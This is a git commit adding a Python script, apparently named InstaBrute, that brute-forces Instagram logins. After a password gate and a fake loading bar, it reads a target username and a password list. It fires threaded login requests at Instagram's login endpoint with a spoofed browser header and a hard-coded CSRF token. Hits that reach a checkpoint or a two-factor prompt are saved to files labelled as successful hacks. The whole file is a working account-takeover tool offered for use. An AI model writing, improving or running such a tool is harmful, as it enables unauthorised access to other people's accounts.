f15eece48fae4fdd6171d742c4fe7f77c5c27547
Reaper <76744878+plzu@users.noreply.github.com>
2021-04-14 14:17:15 +0300

    Add files via upload

---
+++ instagram.py
@@ -0,0 +1,124 @@
+from __future__ import absolute_import
+from __future__ import print_function
+from random import randint
+from six.moves import input
+import os
+import sys , time , random , threading , requests
+CheckVersion = str (sys.version) 
+import re
+from datetime import datetime
+reaper = input ("Enter Password : ")
+if reaper == "EYE" :
+        print ("Thanks..."*4)
+else :
+        print ("ERROR... ENTER PASSWORD...")
+        os.system("exit")
+print("loding")
+time.sleep(0.3)
+print("10%■□□□□□□□□□")
+time.sleep(0.3)
+print("20%■■□□□□□□□□")
+time.sleep(0.3)
+print("30%■■■□□□□□□□")
+time.sleep(0.3)
+print("40%■■■■□□□□□□")
+time.sleep(0.3)
+print("50%■■■■■□□□□□")
+time.sleep(0.3)
+print("60%■■■■■■□□□□")
+time.sleep(0.3)
+print("70%■■■■■■■□□□")
+time.sleep(0.3)
+print("80%■■■■■■■■□□")
+time.sleep(0.3)
+print("90%■■■■■■■■■□")
+time.sleep(0.3)
+print("100%■■■■■■■■■")
+time.sleep(0.3)
+os.system("clear")
+print("""
+⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄
+⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄
+⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄
+⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄
+⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰
+⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤
+⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗
+⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄
+⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄
+⠘⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄⠄⠄⠄⠄⠄⠄⠄⠹⠈⢋⣽⣿⣿⣿⣿⣵⣾⠃⠄
+⠄⠘⣿⣿⣿⣿⣿⣿⣿⣿⠄⣴⣿⣶⣄⠄⣴⣶⠄⢀⣾⣿⣿⣿⣿⣿⣿⠃⠄⠄
+⠄⠄⠈⠻⣿⣿⣿⣿⣿⣿⡄⢻⣿⣿⣿⠄⣿⣿⡀⣾⣿⣿⣿⣿⣛⠛⠁⠄⠄⠄
+⠄⠄⠄⠄⠈⠛⢿⣿⣿⣿⠁⠞⢿⣿⣿⡄⢿⣿⡇⣸⣿⣿⠿⠛⠁⠄⠄⠄⠄⠄
+⠄⠄⠄⠄⠄⠄⠄⠉⠻⣿⣿⣾⣦⡙⠻⣷⣾⣿⠃⠿⠋⠁⠄⠄⠄⠄⠄⢀⣠⣴
+⣿⣿⣿⣶⣶⣮⣥⣒⠲⢮⣝⡿⣿⣿⡆⣿⡿⠃⠄⠄⠄⠄⠄⠄⠄⣠⣴⣿⣿⣿
+""")
+
+
+time.sleep(1)
+class InstaBrute (object):
+    def __init__(self):
+
+        try:
+            user = input ('usr: ')
+            Combo = input (' pass: ')
+            
+
+        except:
+            print (' The tool was arrested exit ')
+            sys.exit ()
+
+        with open (Combo, 'r') as x:
+            Combolist = x.read ().splitlines ()
+        thread = []
+        self.Coutprox = 0
+        for combo in Combolist:
+            password = combo.split (':')[0]
+            t = threading.Thread (target=self.New_Br, args=(user, password))
+            t.start ()
+            thread.append (t)
+            time.sleep (0.9)
+        for j in thread:
+            j.join ()
+
+    def cls(self):
+        linux = 'clear'
+        windows = 'cls'
+        os.system ([linux, windows][os.name == 'nt'])
+
+    def New_Br(self, user, pwd):
+        link = 'https://www.instagram.com/accounts/login/'
+        login_url = 'https://www.instagram.com/accounts/login/ajax/'
+
+        time = int (datetime.now ().timestamp ())
+
+        payload = {
+            'username': user,
+            'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pwd}',
+            'queryParams': {},
+            'optIntoOneTap': 'false'
+        }
+
+        with requests.Session () as s:
+            r = s.get (link)
+            r = s.post (login_url, data=payload, headers={
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
+                "X-Requested-With": "XMLHttpRequest",
+                "Referer": "https://www.instagram.com/accounts/login/",
+                "x-csrftoken": 'ZxKmz4hXp6XKmTPg9lzgYxXN4sFr2pzo'
+            })
+            print (f'{user}:{pwd}\n""""""""""""""""""""""""""""""""""""""""""')
+
+
+            if 'checkpoint_url' in r.text:
+                print (('' + user + ':' + pwd + ' --> Good hack '))
+                with open ('hack.txt', 'a') as x:
+                    x.write (user + ':' + pwd + '\n')
+            elif 'two_factor_required' in r.text:
+                print (('' + user + ':' + pwd + ' -->  Good It has to be checked '))
+                with open ('results_NeedVerfiy.txt', 'a') as x:
+                    x.write (user + ':' + pwd + '\n')
+
+
+InstaBrute()
+
